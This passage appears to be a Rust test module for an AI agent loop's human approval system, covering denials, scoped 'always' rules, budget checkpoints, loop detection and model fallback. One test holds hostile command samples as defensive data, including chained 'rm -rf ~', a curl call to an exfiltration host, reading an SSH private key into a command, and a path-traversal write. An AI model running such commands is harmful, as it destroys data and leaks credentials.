    }

    #[tokio::test]
    async fn a_denied_call_is_reported_to_the_model() {
        let (_d, s, p) = setup().await;
        let sid = session(&s).await;
        let conv = MemoryConversation::new("Tu es Pénélope.", "supprime");
        let e = exec(false);
        let loop_ = AgentLoop::new(s.clone(), p.clone());

        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "shell_exec", json!({"command":"rm -rf target"}))],
        ));
        let id = match loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap()
        {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };
        loop_
            .decide_approval(&id, &Decision::deny("cli", Some("pas maintenant".into())))
            .await
            .unwrap();
        p.reply("d'accord, je n'y touche pas");
        let out = loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap();
        assert!(matches!(out, TurnOutcome::Answered { .. }), "{out:?}");
        assert_eq!(e.calls.load(Ordering::SeqCst), 0);
        let refusal = &conv.messages()[2];
        assert!(
            refusal.text().contains("pas maintenant"),
            "{}",
            refusal.text()
        );
    }

    #[tokio::test]
    async fn always_decision_creates_a_revocable_rule() {
        let (_d, s, p) = setup().await;
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "shell_exec", json!({"command":"cargo build"}))],
        ));
        let sid = session(&s).await;
        let e = exec(false);
        let loop_ = AgentLoop::new(s.clone(), p.clone());
        let id = match loop_.run(request(&sid), &e).await.unwrap() {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };

        assert!(
            loop_
                .resume_after_approval(&id, &Decision::approve_always("telegram"))
                .await
                .unwrap()
        );
        let rules = s.policies.active_rules().await.unwrap();
        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].tool.as_deref(), Some("shell_exec"));
        assert_eq!(rules[0].decision, PolicyDecision::Auto);
    }

    #[tokio::test]
    async fn a_session_window_creates_a_rule_bound_to_the_session() {
        let (_d, s, p) = setup().await;
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "shell_exec", json!({"command":"cargo build"}))],
        ));
        let sid = session(&s).await;
        let e = exec(false);
        let loop_ = AgentLoop::new(s.clone(), p.clone());
        let id = match loop_.run(request(&sid), &e).await.unwrap() {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };
        let d = Decision {
            window: PolicyWindow::Session,
            choice: "Pour cette session".into(),
            ..Decision::approve_once("telegram")
        };
        loop_.decide_approval(&id, &d).await.unwrap();
        let rules = s.policies.active_rules().await.unwrap();
        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].window, PolicyWindow::Session);
        assert_eq!(rules[0].window_ref.as_deref(), Some(sid.as_str()));
    }

    #[tokio::test]
    async fn a_second_decision_does_not_win() {
        let (_d, s, p) = setup().await;
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "shell_exec", json!({"command":"x"}))],
        ));
        let sid = session(&s).await;
        let e = exec(false);
        let loop_ = AgentLoop::new(s.clone(), p.clone());
        let id = match loop_.run(request(&sid), &e).await.unwrap() {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };
        assert!(
            loop_
                .resume_after_approval(&id, &Decision::approve_once("telegram"))
                .await
                .unwrap()
        );
        assert!(
            !loop_
                .resume_after_approval(&id, &Decision::deny("cli", None))
                .await
                .unwrap(),
            "la première décision gagne"
        );
    }

    /// §4.2 : un effet déjà `completed` est rejoué, jamais ré-exécuté.
    #[tokio::test]
    async fn completed_effects_are_replayed_not_reexecuted() {
        let (_d, s, p) = setup().await;
        let sid = session(&s).await;

        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "fs_read", json!({"path":"a.rs"}))],
        ));
        p.reply("lu");
        let e = exec(false);
        AgentLoop::new(s.clone(), p.clone())
            .run(request(&sid), &e)
            .await
            .unwrap();
        assert_eq!(e.calls.load(Ordering::SeqCst), 1);

        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "fs_read", json!({"path":"a.rs"}))],
        ));
        p.reply("relu");
        AgentLoop::new(s.clone(), p.clone())
            .run(request(&sid), &e)
            .await
            .unwrap();
        assert_eq!(
            e.calls.load(Ordering::SeqCst),
            1,
            "aucune seconde exécution"
        );
    }

    #[tokio::test]
    async fn tool_errors_go_back_to_the_model() {
        let (_d, s, p) = setup().await;
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "fs_read", json!({"path":"a.rs"}))],
        ));
        p.reply("je vois l'erreur, je change d'approche");
        let sid = session(&s).await;
        let e = exec(true);
        let out = AgentLoop::new(s.clone(), p.clone())
            .run(request(&sid), &e)
            .await
            .unwrap();
        match out {
            TurnOutcome::Answered { text, .. } => assert!(text.contains("change d'approche")),
            other => panic!("le tour doit continuer malgré l'erreur : {other:?}"),
        }
        assert_eq!(
            s.effects
                .count_by_state(penelope_kernel::effects::EffectState::Failed)
                .await
                .unwrap(),
            1
        );
    }

    #[tokio::test]
    async fn loop_detector_aborts_the_turn() {
        let (_d, s, p) = setup().await;
        for i in 0..8 {
            p.push(Scripted::ToolCalls(
                String::new(),
                vec![call(&format!("c{i}"), "fs_read", json!({"path":"a.rs"}))],
            ));
        }
        let sid = session(&s).await;
        let e = exec(false);
        let out = AgentLoop::new(s.clone(), p.clone())
            .run(request(&sid), &e)
            .await
            .unwrap();
        match out {
            TurnOutcome::LoopAborted {
                report, choices, ..
            } => {
                assert!(report.contains("fs_read"));
                assert!(report.contains("Appels du tour"));
                assert_eq!(choices.len(), 3, "suites par défaut");
            }
            other => panic!("{other:?}"),
        }
    }

    /// Issue #31 : un outil qui renvoie toujours la même erreur, appelé en boucle. Le tour
    /// répond quand même en citant l'erreur et en proposant des suites, la conversation
    /// garde le résultat et la note d'arrêt, et le message suivant ne relance rien.
    #[tokio::test]
    async fn a_stopped_loop_still_answers_with_the_real_error_and_choices() {
        let (_d, s, p) = setup().await;
        for i in 0..4 {
            p.push(Scripted::ToolCalls(
                String::new(),
                vec![call(&format!("c{i}"), "fs_read", json!({"path": "mails"}))],
            ));
        }
        p.reply(
            "J'ai lu la boîte trois fois, l'outil répond « disque plein ».\n\
             CHOIX : Chercher autrement | Je te précise le compte | Laisser tomber",
        );
        let sid = session(&s).await;
        let e = exec(true);
        let conv = MemoryConversation::new("système", "regarde mes mails");
        let spec = TurnSpec {
            session_id: sid.clone(),
            run_id: None,
            turn_id: None,
            model_id: "mock/model".into(),
            fallback_models: Vec::new(),
            tools: vec![ToolDef::new("fs_read", "lire", json!({"type":"object"}))],
            allowed_tools: Vec::new(),
            cancel: CancelToken::new(),
        };
        let agent = AgentLoop::new(s.clone(), p.clone());
        let out = agent
            .run_conversation(&spec, &conv, &e, &NullSink)
            .await
            .unwrap();
        let TurnOutcome::LoopAborted {
            answer, choices, ..
        } = out
        else {
            panic!("{out:?}");
        };
        assert!(answer.contains("disque plein"), "{answer}");
        assert!(!answer.contains("CHOIX"));
        assert_eq!(
            choices,
            vec![
                "Chercher autrement",
                "Je te précise le compte",
                "Laisser tomber"
            ]
        );
        let wrap_up = p.requests().last().unwrap().clone();
        assert_eq!(
            wrap_up.tool_choice,
            Some(ToolChoice::None),
            "dernière réponse sans outil"
        );

        let history = conv.messages();
        let stopped = history
            .iter()
            .find(|m| m.role == Role::Tool && m.text().contains(LOOP_STOP_NOTE))
            .expect("note d'arrêt dans la conversation");
        assert!(
            stopped.text().contains("disque plein"),
            "{}",
            stopped.text()
        );
        assert_eq!(history.last().unwrap().text(), answer, "réponse gardée");
        assert!(pending_calls(&history).is_empty(), "plus rien à relancer");

        // « Donc ? » : le modèle voit la note, aucun outil n'est rejoué d'office.
        let calls_before = e.calls.load(Ordering::SeqCst);
        conv.record(&ChatMessage::user("Donc ?"), false)
            .await
            .unwrap();
        p.reply("Je n'insiste pas avec la même lecture : précise le compte.");
        let next = agent
            .run_conversation(&spec, &conv, &e, &NullSink)
            .await
            .unwrap();
        assert!(matches!(next, TurnOutcome::Answered { .. }), "{next:?}");
        assert_eq!(e.calls.load(Ordering::SeqCst), calls_before);
        let seen = p.requests().last().unwrap().clone();
        assert!(
            seen.messages
                .iter()
                .any(|m| m.text().contains(LOOP_STOP_NOTE)),
            "la note d'arrêt est dans l'historique envoyé au modèle"
        );
    }

    #[test]
    fn choices_are_split_from_the_answer() {
        let (answer, choices) =
            split_choices("Erreur : 401.\n\n**CHOIX :** Réessayer | « Autre compte »  |");
        assert_eq!(answer, "Erreur : 401.");
        assert_eq!(choices, vec!["Réessayer", "Autre compte"]);
        let (answer, choices) = split_choices("Rien à proposer.");
        assert_eq!(answer, "Rien à proposer.");
        assert!(choices.is_empty());
    }

    #[tokio::test]
    async fn cancellation_stops_the_turn() {
        let (_d, s, p) = setup().await;
        p.reply("réponse");
        let sid = session(&s).await;
        let req = request(&sid);
        req.cancel.cancel();
        let e = exec(false);
        assert_eq!(
            AgentLoop::new(s.clone(), p.clone())
                .run(req, &e)
                .await
                .unwrap(),
            TurnOutcome::Cancelled
        );
    }

    #[tokio::test]
    async fn exceeded_budget_stops_before_calling_the_model() {
        let (_d, s, p) = setup().await;
        s.budget
            .record(penelope_kernel::budget::UsageRecord {
                model: "m".into(),
                provider: "mock".into(),
                cost_usd: 100.0,
                ..Default::default()
            })
            .await
            .unwrap();
        let sid = session(&s).await;
        let e = exec(false);
        let out = AgentLoop::new(s.clone(), p.clone())
            .run(request(&sid), &e)
            .await
            .unwrap();
        match &out {
            TurnOutcome::BudgetExceeded {
                spent_usd,
                limit_usd,
                ..
            } => assert!(spent_usd > limit_usd, "{out:?}"),
            other => panic!("{other:?}"),
        }
        assert_eq!(p.call_count(), 0, "le modèle n'est pas appelé");
        assert_eq!(s.approvals.pending(10).await.unwrap().len(), 1);
    }

    fn spent(turn: &str, calls: usize, each: f64) -> Vec<penelope_kernel::budget::UsageRecord> {
        (0..calls)
            .map(|_| penelope_kernel::budget::UsageRecord {
                turn_id: Some(turn.into()),
                model: "m".into(),
                provider: "mock".into(),
                role: Some("chat".into()),
                prompt: 100_000,
                cost_usd: each,
                ..Default::default()
            })
            .collect()
    }

    /// Issue #19 : un tour qui a coûté 1 $ (reprises comprises) demande s'il continue ;
    /// accepté, il reprend jusqu'au palier suivant et sa réponse dit ce qu'il a coûté ;
    /// refusé, il s'arrête.
    #[tokio::test]
    async fn a_costly_turn_asks_before_going_on() {
        let (_d, s, p) = setup().await;
        let sid = session(&s).await;
        for u in spent("t_test", 8, 0.13) {
            s.budget.record(u).await.unwrap();
        }
        let conv = MemoryConversation::new("Tu es Pénélope.", "enquête");
        let e = exec(false);
        let loop_ = AgentLoop::new(s.clone(), p.clone());
        let sink = RecordingSink::default();
        let id = match loop_
            .run_conversation(&spec(&sid), &conv, &e, &sink)
            .await
            .unwrap()
        {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };
        assert_eq!(p.call_count(), 0, "rien n'est dépensé avant la réponse");
        let a = s.approvals.get(&id).await.unwrap().unwrap();
        assert_eq!(a.payload["checkpoint"], true);
        assert!(
            a.payload["reason"]
                .as_str()
                .unwrap()
                .contains("Ce tour a coûté 1,04 $ (8 appels au modèle)"),
            "{}",
            a.payload
        );
        assert!(
            sink.events()
                .iter()
                .any(|ev| matches!(ev, TurnEvent::Approval { .. }))
        );

        decide_approval(&s, &id, &Decision::approve_once("test"))
            .await
            .unwrap();
        p.reply("conclusion");
        match loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap()
        {
            TurnOutcome::Answered { text, .. } => {
                assert!(text.starts_with("conclusion"), "{text}");
                assert!(
                    text.contains("_Coût de ce tour : 1,04 $ (9 appels au modèle)._"),
                    "{text}"
                );
            }
            other => panic!("{other:?}"),
        }

        // Palier suivant, refusé : le tour s'arrête sans appeler le modèle.
        for u in spent("t_test", 1, 1.0) {
            s.budget.record(u).await.unwrap();
        }
        let id = match loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap()
        {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };
        decide_approval(&s, &id, &Decision::deny("test", None))
            .await
            .unwrap();
        let calls = p.call_count();
        match loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap()
        {
            TurnOutcome::Answered { text, .. } => {
                assert!(text.contains("Tour arrêté à ta demande"), "{text}")
            }
            other => panic!("{other:?}"),
        }
        assert_eq!(p.call_count(), calls);
    }

    /// Issue #19 : le plafond d'appels compte tout le tour, reprises comprises, et le
    /// dixième appel rappelle de regrouper ou de déléguer.
    #[tokio::test]
    async fn the_call_cap_spans_resumptions_and_suggests_delegating() {
        let (_d, s, p) = setup().await;
        let sid = session(&s).await;
        for u in spent("t_test", 9, 0.0) {
            s.budget.record(u).await.unwrap();
        }
        let conv = MemoryConversation::new("Tu es Pénélope.", "enquête");
        let e = exec(false);
        let loop_ = AgentLoop::new(s.clone(), p.clone());
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c9", "fs_read", json!({"path": "src/lib.rs"}))],
        ));
        p.reply("fini");
        loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap();
        let tail = conv.tail().await.unwrap();
        let result = tail.iter().find(|m| m.role == Role::Tool).unwrap();
        assert!(
            result.text().contains("10 appels au modèle dans ce tour"),
            "{}",
            result.text()
        );
        assert!(result.text().contains("sub_agent_spawn"));

        for u in spent("t_test", 20, 0.0) {
            s.budget.record(u).await.unwrap();
        }
        let calls = p.call_count();
        match loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap()
        {
            TurnOutcome::Failed { error } => {
                assert!(
                    error.contains("reprises après approbation comprises"),
                    "{error}"
                )
            }
            other => panic!("{other:?}"),
        }
        assert_eq!(p.call_count(), calls);
    }

    #[test]
    fn the_budget_message_names_the_key_of_the_scope_reached() {
        let session = budget_exceeded_text("session", 5.12, 5.0);
        assert!(
            session.contains("5.12 $ dépensés pour un plafond de 5.00 $"),
            "{session}"
        );
        assert!(session.contains("budget.session_usd 10"), "{session}");
        assert!(session.contains("/new"), "{session}");
        assert!(!session.contains("daily_usd"), "{session}");
        assert!(session.contains("/compact"), "{session}");

        let day = budget_exceeded_text("jour", 20.4, 20.0);
        assert!(day.contains("budget.daily_usd 40"), "{day}");
        assert!(!day.contains("/new"), "{day}");
        assert!(budget_exceeded_text("run", 6.0, 5.0).contains("budget.run_usd 10"));
    }

    #[tokio::test]
    async fn tools_outside_the_allowlist_are_refused() {
        let (_d, s, p) = setup().await;
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "shell_exec", json!({"command":"x"}))],
        ));
        p.reply("compris");
        let sid = session(&s).await;
        let mut req = request(&sid);
        req.allowed_tools = vec!["fs_*".into()];
        let e = exec(false);
        let out = AgentLoop::new(s.clone(), p.clone())
            .run(req, &e)
            .await
            .unwrap();
        assert!(matches!(out, TurnOutcome::Answered { .. }), "{out:?}");
        assert_eq!(e.calls.load(Ordering::SeqCst), 0);
        assert_eq!(
            s.approvals.pending(10).await.unwrap().len(),
            0,
            "un outil hors liste blanche ne demande même pas d'approbation"
        );
    }

    #[tokio::test]
    async fn deltas_are_streamed_to_the_sink() {
        let (_d, s, p) = setup().await;
        p.reply("bonjour à toi");
        let sid = session(&s).await;
        let conv = MemoryConversation::new("Tu es Pénélope.", "salut");
        let sink = RecordingSink::default();
        AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&spec(&sid), &conv, &exec(false), &sink)
            .await
            .unwrap();
        let streamed: String = sink
            .events()
            .iter()
            .filter_map(|e| match e {
                TurnEvent::Delta(t) => Some(t.clone()),
                _ => None,
            })
            .collect();
        assert_eq!(streamed, "bonjour à toi");
        assert_eq!(conv.messages().last().unwrap().text(), "bonjour à toi");
    }

    #[tokio::test(start_paused = true)]
    async fn a_transient_failure_falls_back_to_the_next_model() {
        let (_d, s, p) = setup().await;
        p.push(Scripted::Error(LlmErrorKind::Transient, "503".into()));
        p.push(Scripted::Error(LlmErrorKind::Transient, "503".into()));
        p.reply("réponse du repli");
        let sid = session(&s).await;
        let conv = MemoryConversation::new("Tu es Pénélope.", "salut");
        let mut sp = spec(&sid);
        sp.fallback_models = vec!["mock/repli".into()];
        let out = AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&sp, &conv, &exec(false), &NullSink)
            .await
            .unwrap();
        assert!(matches!(out, TurnOutcome::Answered { .. }), "{out:?}");
        let models: Vec<String> = p.requests().iter().map(|r| r.model.clone()).collect();
        // Une attente, puis le repli : tant qu'un autre modèle reste, on n'insiste pas
        // sur celui qui vient d'échouer (issue #50).
        assert_eq!(models, vec!["mock/model", "mock/model", "mock/repli"]);
    }

    /// #67 : un « toujours » accordé à une commande vaut pour sa famille, pas pour tout
    /// `shell_exec` : une autre commande redemande.
    #[test]
    fn an_always_rule_is_bounded_to_the_call_it_was_granted_for() {
        use penelope_hitl::policy::{CMD_PREFIX_OP, ORIGIN_OP, PATH_PREFIX_OP};
        let p = arg_pattern(
            "shell_exec",
            Some(&json!({"command": "cargo test -p penelope-kernel"})),
        )
        .expect("motif");
        assert_eq!(p["command"][CMD_PREFIX_OP], "cargo test");
        let rule = penelope_hitl::PolicyRule {
            id: "r1".into(),
            scope: penelope_hitl::RuleScope::Tool,
            tool: Some("shell_exec".into()),
            server: None,
            arg_match: Some(p),
            decision: penelope_kernel::risk::PolicyDecision::Auto,
            window: PolicyWindow::Always,
            window_ref: None,
            created_at: "2026-09-18T00:00:00Z".into(),
            hits: 0,
            revoked_at: None,
        };
        assert!(rule.matches(
            "shell_exec",
            None,
            &json!({"command": "cargo test -p penelope-store"})
        ));
        assert!(
            !rule.matches("shell_exec", None, &json!({"command": "rm -rf target"})),
            "une autre commande redemande"
        );
        // Enchaînement : la règle ne couvre pas ce qui suit un `;` ou un `&&`.
        for detour in [
            "cargo test; rm -rf ~",
            "cargo test && curl https://exfil.example",
            "cargo test $(cat ~/.ssh/id_ed25519)",
            "cargo test > /tmp/vol",
            "cargo testament",
        ] {
            assert!(
                !rule.matches("shell_exec", None, &json!({"command": detour})),
                "`{detour}` doit redemander"
            );
        }

        // Fichiers : la règle vaut pour le répertoire, et un `..` n'en sort pas.
        let p = arg_pattern("fs_write", Some(&json!({"path": "src/a.rs"}))).expect("motif");
        assert_eq!(p["path"][PATH_PREFIX_OP], "src/");
        let files = penelope_hitl::PolicyRule {
            arg_match: Some(p),
            tool: Some("fs_write".into()),
            id: "r2".into(),
            ..rule.clone()
        };
        assert!(files.matches("fs_write", None, &json!({"path": "src/b.rs"})));
        assert!(
            !files.matches("fs_write", None, &json!({"path": "src/../../.zshrc"})),
            "un `..` ne sort pas du répertoire autorisé"
        );

        // URL : l'origine exacte, pas un préfixe de texte.
        let p = arg_pattern(
            "http_fetch",
            Some(&json!({"url": "https://example.com/a/b"})),
        )
        .expect("motif");
        assert_eq!(p["url"][ORIGIN_OP], "https://example.com");
        let web = penelope_hitl::PolicyRule {
            arg_match: Some(p),
            tool: Some("http_fetch".into()),
            id: "r3".into(),
            ..rule.clone()
        };
        assert!(web.matches(
            "http_fetch",
            None,
            &json!({"url": "https://example.com/autre"})
        ));
        assert!(
            !web.matches(
                "http_fetch",
                None,
                &json!({"url": "https://example.com.exfil.test/x"})
            ),
            "un hôte qui commence pareil n'est pas le même hôte"
        );

        // Outil MCP : rien n'est dérivé, la règle reste celle de l'outil.
        assert!(arg_pattern("tool_call", Some(&json!({"server": "forge"}))).is_none());
    }

    /// #50 : avec OpenRouter, une erreur transitoire d'avant flux est réessayée au lieu
    /// de faire échouer le tour, et le nouvel essai est tracé.
    #[tokio::test(start_paused = true)]
    async fn a_transient_error_before_the_stream_is_retried_with_openrouter() {
        let (_d, s, p) = setup().await;
        p.named("openrouter");
        p.push(Scripted::Error(LlmErrorKind::Transient, "503".into()));
        p.reply("réponse après nouvel essai");
        let sid = session(&s).await;
        let conv = MemoryConversation::new("Tu es Pénélope.", "salut");
        let out = AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&spec(&sid), &conv, &exec(false), &NullSink)
            .await
            .unwrap();
        assert!(matches!(out, TurnOutcome::Answered { .. }), "{out:?}");
        let models: Vec<String> = p.requests().iter().map(|r| r.model.clone()).collect();
        assert_eq!(models, vec!["mock/model", "mock/model"], "même modèle");
        let events = s.events.range(0, 200).await.unwrap();
        assert!(
            events.iter().any(|e| e.kind == "llm.retried"),
            "le nouvel essai doit être tracé"
        );
    }

    /// #50 : après les tentatives, l'échec dit combien de fois on a essayé.
    #[tokio::test(start_paused = true)]
    async fn repeated_connection_timeouts_say_how_many_attempts_were_made() {
        let (_d, s, p) = setup().await;
        p.named("openrouter");
        for _ in 0..4 {
            p.push(Scripted::Error(
                LlmErrorKind::Transient,
                "délai de connexion".into(),
            ));
        }
        let sid = session(&s).await;
        let conv = MemoryConversation::new("Tu es Pénélope.", "salut");
        let out = AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&spec(&sid), &conv, &exec(false), &NullSink)
            .await
            .unwrap();
        match out {
            TurnOutcome::Failed { error } => {
                assert!(error.contains("4 tentatives"), "{error}");
                assert!(error.contains("7 s"), "{error}");
            }
            other => panic!("le tour devait échouer : {other:?}"),
        }
        assert_eq!(p.call_count(), 4, "trois nouvelles tentatives, pas plus");
    }

    /// #50 : `/stop` pendant l'attente arrête le tour sans rappeler le modèle.
    #[tokio::test(start_paused = true)]
    async fn a_stop_during_the_retry_wait_ends_the_turn() {
        let (_d, s, p) = setup().await;
        p.named("openrouter");
        p.push(Scripted::Error(LlmErrorKind::Transient, "503".into()));
        p.reply("ne devrait jamais partir");
        let sid = session(&s).await;
        let sp = spec(&sid);
        // L'arrêt arrive pendant l'attente, juste après le premier appel refusé.
        let cancel = sp.cancel.clone();
        let watcher = p.clone();
        tokio::spawn(async move {
            loop {
                if watcher.call_count() >= 1 {
                    cancel.cancel();
                    return;
                }
                tokio::time::sleep(std::time::Duration::from_millis(5)).await;
            }
        });
        let conv = MemoryConversation::new("Tu es Pénélope.", "salut");
        let out = AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&sp, &conv, &exec(false), &NullSink)
            .await
            .unwrap();
        assert!(
            matches!(out, TurnOutcome::Cancelled | TurnOutcome::Failed { .. }),
            "{out:?}"
        );
        assert_eq!(p.call_count(), 1, "aucun nouvel appel après l'arrêt");
    }

    /// Issue #5 : une erreur arrivée pendant le flux, avant tout texte, est rejouée puis
    /// passe au modèle de repli ; après du texte, elle est dite telle quelle.
    #[tokio::test]
    async fn a_stream_cut_before_any_text_is_retried_then_falls_back() {
        let (_d, s, p) = setup().await;
        let sid = session(&s).await;
        let mut sp = spec(&sid);
        sp.fallback_models = vec!["mock/repli".into()];

        p.push(Scripted::MidStreamError(
            String::new(),
            "Too many requests".into(),
        ));
        p.push(Scripted::MidStreamError(
            String::new(),
            "Too many requests".into(),
        ));
        p.reply("réponse du repli");
        let conv = MemoryConversation::new("Tu es Pénélope.", "salut");
        let out = AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&sp, &conv, &exec(false), &NullSink)
            .await
            .unwrap();
        assert!(
            matches!(out, TurnOutcome::Answered { ref text, .. } if text == "réponse du repli"),
            "{out:?}"
        );
        let models: Vec<String> = p.requests().iter().map(|r| r.model.clone()).collect();
        assert_eq!(models, vec!["mock/model", "mock/model", "mock/repli"]);

        // Du texte est déjà parti : pas de relance silencieuse, l'échec le dit.
        p.push(Scripted::MidStreamError(
            "Voici le début".into(),
            "Too many requests".into(),
        ));
        let conv = MemoryConversation::new("Tu es Pénélope.", "encore");
        let before = p.requests().len();
        let out = AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&sp, &conv, &exec(false), &NullSink)
            .await
            .unwrap();
        match out {
            TurnOutcome::Failed { error } => {
                assert!(error.contains("coupée en cours d'écriture"), "{error}")
            }
            other => panic!("{other:?}"),
        }
        assert_eq!(p.requests().len(), before + 1, "un seul appel");
    }

    #[tokio::test]
    async fn an_empty_answer_is_retried_once_then_reported() {
        let (_d, s, p) = setup().await;
        let sid = session(&s).await;

        // Vide puis correcte : la relance suffit, rien de vide dans le transcript.
        p.reply("");
        p.reply("Bonjour !");
        let conv = MemoryConversation::new("Tu es Pénélope.", "salut");
        let out = AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&spec(&sid), &conv, &exec(false), &NullSink)
            .await
            .unwrap();
        assert!(
            matches!(out, TurnOutcome::Answered { ref text, .. } if text == "Bonjour !"),
            "{out:?}"
        );
        assert_eq!(
            conv.messages().len(),
            2,
            "la réponse vide n'est pas enregistrée"
        );
        let last_request = p.requests().last().unwrap().clone();
        assert!(
            last_request
                .messages
                .last()
                .unwrap()
                .text()
                .contains("Relance automatique")
        );

        // Vide deux fois : erreur explicite, qui nomme le modèle.
        p.reply("");
        p.reply("   ");
        let conv = MemoryConversation::new("Tu es Pénélope.", "salut");
        let out = AgentLoop::new(s.clone(), p.clone())
            .run_conversation(&spec(&sid), &conv, &exec(false), &NullSink)
            .await
            .unwrap();
        match out {
            TurnOutcome::Failed { error } => {
                assert!(error.contains("aucun texte"), "{error}");
                assert!(error.contains("mock/model"), "{error}");
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn pending_calls_ignore_answered_and_abandoned_ones() {
        let assistant = ChatMessage {
            tool_calls: vec![
                call("a", "fs_read", json!({})),
                call("b", "fs_read", json!({})),
            ],
            ..ChatMessage::assistant("")
        };
        let mut t = vec![ChatMessage::user("x"), assistant.clone()];
        assert_eq!(pending_calls(&t).len(), 2);
        t.push(ChatMessage::tool_result("a", "fs_read", "ok"));
        let p = pending_calls(&t);
        assert_eq!(p.len(), 1);
        assert_eq!(p[0].id, "b");
        // Un nouveau message utilisateur abandonne l'appel restant.
        t.push(ChatMessage::user("laisse tomber"));
        assert!(pending_calls(&t).is_empty());
    }

    #[test]
    fn effect_kinds_and_servers_are_derived_from_names() {
        assert_eq!(effect_kind("mcp__forge__create_pr"), EffectKind::Mcp);
        assert_eq!(effect_kind("shell_exec"), EffectKind::Shell);
        assert_eq!(effect_kind("git_push"), EffectKind::Git);
        assert_eq!(effect_kind("fs_write"), EffectKind::Fs);
        assert_eq!(effect_kind("send_message"), EffectKind::Telegram);
        assert_eq!(server_of("mcp__forge__create_pr").as_deref(), Some("forge"));
        assert!(server_of("fs_read").is_none());
    }

    #[test]
    fn blind_models_get_a_mention_instead_of_images() {
        let catalog = penelope_llm::catalog::Catalog::new();
        let mut seeing = penelope_llm::catalog::ModelInfo::minimal("v/voit", "v", 32_000);
        seeing.input_modalities = vec!["text".into(), "image".into()];
        catalog.upsert(vec![
            seeing,
            penelope_llm::catalog::ModelInfo::minimal("t/texte", "t", 32_000),
        ]);
        let photo = ChatMessage {
            content: vec![
                Content::text("regarde"),
                Content::ImageUrl {
                    url: "data:image/jpeg;base64,AA".into(),
                    detail: None,
                },
            ],
            ..ChatMessage::user("")
        };
        let msgs = vec![photo];
        let blind = fit_modalities(&msgs, &catalog, "openrouter:t/texte");
        assert!(
            matches!(&blind[0].content[1], Content::Text { text } if text.contains("image non transmise"))
        );
        let seen = fit_modalities(&msgs, &catalog, "openrouter:v/voit");
        assert!(matches!(seen[0].content[1], Content::ImageUrl { .. }));
        let unknown = fit_modalities(&msgs, &catalog, "openrouter:inconnu/x");
        assert!(
            matches!(unknown[0].content[1], Content::ImageUrl { .. }),
            "sans catalogue, on ne retire rien"
        );
    }
}
